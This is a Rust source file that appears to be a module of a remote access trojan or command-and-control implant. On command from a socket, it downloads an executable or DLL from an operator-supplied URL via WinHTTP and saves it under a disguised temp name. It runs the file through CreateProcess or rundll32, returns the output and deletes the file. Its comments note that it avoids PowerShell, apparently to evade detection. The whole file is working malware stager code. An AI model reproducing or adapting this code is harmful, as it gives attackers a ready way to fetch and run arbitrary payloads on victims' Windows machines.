// Remote File Execution — download via WinHTTP, run via CreateProcess
// No PowerShell, no reqwest.

use std::{env, fs, process::Command};
use crate::Sock;
use crate::send;

fn rfe_send(sock: &Sock, msg: &str) {
    send(sock, &format!("[rfe_result]{}", msg));
}

pub fn handle_exe(sock: &Sock, payload: &str) {
    let (url, args) = match payload.find('|') {
        Some(i) => (&payload[..i], payload[i + 1..].trim()),
        None    => (payload.trim(), ""),
    };

    let tmp = tmp_path("exe");
    if let Err(e) = winhttp_download(url, &tmp) {
        rfe_send(sock, &format!("error:Download failed: {}", e));
        return;
    }

    let mut cmd = Command::new(&tmp);
    if !args.is_empty() {
        cmd.args(args.split_whitespace());
    }

    match cmd.output() {
        Ok(o) => {
            let out = format!(
                "{}{}",
                String::from_utf8_lossy(&o.stdout),
                String::from_utf8_lossy(&o.stderr)
            );
            let out = out.trim();
            rfe_send(sock, &format!("ok:{}", if out.is_empty() { "(no output)" } else { out }));
        }
        Err(e) => rfe_send(sock, &format!("error:{}", e)),
    }

    let _ = fs::remove_file(&tmp);
}

pub fn handle_dll(sock: &Sock, url: &str) {
    let tmp = tmp_path("dll");
    if let Err(e) = winhttp_download(url, &tmp) {
        rfe_send(sock, &format!("error:Download failed: {}", e));
        return;
    }

    match Command::new("rundll32.exe").arg(&tmp).output() {
        Ok(o) => {
            let out = format!(
                "{}{}",
                String::from_utf8_lossy(&o.stdout),
                String::from_utf8_lossy(&o.stderr)
            );
            let out = out.trim();
            rfe_send(sock, &format!("ok:{}", if out.is_empty() { "(no output)" } else { out }));
        }
        Err(e) => rfe_send(sock, &format!("error:{}", e)),
    }

    let _ = fs::remove_file(&tmp);
}

fn tmp_path(ext: &str) -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .subsec_nanos();
    let base = env::temp_dir();
    base.join(format!("~tmp{:x}.{}", nanos, ext))
        .to_string_lossy()
        .to_string()
}

/// Download `url` to `dest_path` using WinHTTP — no subprocess.
fn winhttp_download(url: &str, dest_path: &str) -> Result<(), String> {
    // Parse url into host + path (simple, handles http/https)
    let (use_ssl, rest) = if url.starts_with("https://") {
        (true, &url[8..])
    } else if url.starts_with("http://") {
        (false, &url[7..])
    } else {
        return Err("Unsupported scheme".to_string());
    };

    let (host, path) = match rest.find('/') {
        Some(i) => (&rest[..i], &rest[i..]),
        None    => (rest, "/"),
    };

    let port: u16 = if use_ssl { 443 } else { 80 };

    let body = winhttp_get(host, port, path, use_ssl)?;
    fs::write(dest_path, &body).map_err(|e| e.to_string())
}

fn winhttp_get(host: &str, port: u16, path: &str, use_ssl: bool) -> Result<Vec<u8>, String> {
    use windows::{
        core::PCWSTR,
        Win32::Networking::WinHttp::*,
    };
    unsafe {
        let agent:   Vec<u16> = "client\0".encode_utf16().collect();
        let host_w:  Vec<u16> = format!("{}\0", host).encode_utf16().collect();
        let path_w:  Vec<u16> = format!("{}\0", path).encode_utf16().collect();
        let verb_w:  Vec<u16> = "GET\0".encode_utf16().collect();

        let session = WinHttpOpen(
            PCWSTR(agent.as_ptr()),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            PCWSTR::null(),
            PCWSTR::null(),
            0,
        );
        if session.is_null() {
            return Err("WinHttpOpen failed".to_string());
        }

        let connect = WinHttpConnect(session, PCWSTR(host_w.as_ptr()), port, 0);
        if connect.is_null() {
            WinHttpCloseHandle(session);
            return Err("WinHttpConnect failed".to_string());
        }

        let flags = if use_ssl { WINHTTP_FLAG_SECURE } else { WINHTTP_OPEN_REQUEST_FLAGS(0) };
        let request = WinHttpOpenRequest(
            connect,
            PCWSTR(verb_w.as_ptr()),
            PCWSTR(path_w.as_ptr()),
            PCWSTR::null(),
            PCWSTR::null(),
            std::ptr::null_mut(),
            flags,
        );
        if request.is_null() {
            WinHttpCloseHandle(connect);
            WinHttpCloseHandle(session);
            return Err("WinHttpOpenRequest failed".to_string());
        }

        let headers: Vec<u16> = Vec::new();
        WinHttpSendRequest(
            request,
            if headers.is_empty() { None } else { Some(&headers) },
            None,
            0,
            0,
            0,
        ).map_err(|e| format!("SendRequest: {}", e.message()))?;
        
        WinHttpReceiveResponse(request, std::ptr::null_mut())
            .map_err(|e| format!("ReceiveResponse: {}", e.message()))?;

        let mut body = Vec::new();
        loop {
            let mut available = 0u32;
            if WinHttpQueryDataAvailable(request, &mut available).is_err() || available == 0 {
                break;
            }
            let mut buf = vec![0u8; available as usize];
            let mut read = 0u32;
            if WinHttpReadData(request, buf.as_mut_ptr() as *mut _, available, &mut read).is_err() {
                break;
            }
            buf.truncate(read as usize);
            body.extend_from_slice(&buf);
        }

        WinHttpCloseHandle(request);
        WinHttpCloseHandle(connect);
        WinHttpCloseHandle(session);

        Ok(body)
    }
}